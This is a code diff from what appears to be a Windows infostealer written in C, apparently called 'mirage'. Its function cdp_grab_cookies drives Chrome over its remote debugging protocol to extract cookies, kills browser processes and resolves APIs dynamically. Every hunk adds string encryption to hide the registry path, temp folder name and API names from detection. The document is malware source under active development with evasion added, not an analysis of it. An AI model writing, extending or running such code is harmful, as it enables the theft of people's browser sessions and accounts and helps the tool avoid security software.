@@ -310,7 +310,8 @@ static int get_chrome_exe_path(char *out, size_t out_max) {
     /* Open HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe */
     /* Use NtOpenKey via syscall stub */
     UNICODE_STRING key_name;
-    wchar_t key_path[] = L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe";
+    wchar_t key_path[128];
+    enc_decrypt_wide(enc_wchrome_app_path, ENC_WCHROME_APP_PATH_LEN, key_path);
     key_name.Buffer = key_path;
     key_name.Length = (USHORT)(wcslen(key_path) * sizeof(wchar_t));
     key_name.MaximumLength = key_name.Length + sizeof(wchar_t);
@@ -391,7 +392,9 @@ int cdp_grab_cookies(const char *chrome_exe_path, const char *output_path) {
 
     wchar_t temp_dir[MAX_PATH];
     fnGetTempPath(MAX_PATH, temp_dir);
-    wcscat_s(temp_dir, MAX_PATH, L"mirage_chrome");
+    wchar_t chrome_dir[32];
+    enc_decrypt_wide(enc_wmirage_chrome, ENC_WMIRAGE_CHROME_LEN, chrome_dir);
+    wcscat_s(temp_dir, MAX_PATH, chrome_dir);
 
     /* Try ports 9222-9230 */
     int port = 0;
@@ -520,7 +523,7 @@ int cdp_grab_cookies(const char *chrome_exe_path, const char *output_path) {
     kill_browser_processes("chrome");
 
     /* Cleanup temp dir */
-    pRemoveDirectoryW fnRmDir = (pRemoveDirectoryW)resolve_fn(kernel32, "RemoveDirectoryW");
+    pRemoveDirectoryW fnRmDir = (pRemoveDirectoryW)({ char fn_rm[32]; enc_decrypt(enc_RemoveDirectoryW, ENC_REMOVEDIRECTORYW_LEN, fn_rm); resolve_fn(kernel32, fn_rm); });
     if (fnRmDir) fnRmDir(temp_dir);
 
     return (cookie_count >= 0) ? 0 : -1;
